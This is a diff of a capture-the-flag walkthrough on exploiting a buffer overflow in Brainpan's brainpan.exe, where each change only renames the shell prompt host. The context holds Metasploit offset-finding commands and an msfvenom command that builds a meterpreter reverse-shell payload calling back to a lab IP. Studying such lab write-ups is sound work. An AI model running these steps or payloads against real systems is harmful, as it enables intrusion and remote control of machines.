@@ -78,7 +78,7 @@ This script will send \x41 (A) incrementally, 100 bytes at a time to port 9999 u
 We are able to establish that we are able to crash the application with a relative number of bytes. Now we need to identify the exact number bytes that it takes to fill the buffer. Metasploit provides a ruby script called pattern_create.rb that will create a unique string with no repeating characters. After we send this payload to the buffer, it will display what the offset is which we'll use for the next step in finding the EIP.
 
 ```
-root@gh0x0st:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
+root@raj:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
 ```
 
@@ -109,7 +109,7 @@ finally:
 Send that payload to the application, make sure it crashed and grab the EIP value in the debugger. For this application, it will be 35724134. We will now use a second script from Metasploit called pattern_offset.rb. What this script will do is take that value and seeing exactly where it exists in the buffer length we designate, showing us the point where the buffer will crash. 
 
 ```
-root@gh0x0st:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134 -l 600
+root@raj:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134 -l 600
 [*] Exact match at offset 524
 ```
 
@@ -249,7 +249,7 @@ If you want to make sure your code is getting to that jump correctly, set a brea
 All of the work we just did debugging brainpan.exe has led up to the moment where we are in a position where we can generate and execute our shell code. We'll use msfvenom to generate our payload, which includes listing our bad characters, your Kali IP and port and add it to our script. 
 
 ~~~
-root@gh0x0st:~# msfvenom -p linux/x86/meterpreter/reverse_tcp -b \x00 LHOST=192.168.1.9 LPORT=4444 -f python
+root@raj:~# msfvenom -p linux/x86/meterpreter/reverse_tcp -b \x00 LHOST=192.168.1.9 LPORT=4444 -f python
 ~~~
 
 ~~~Python
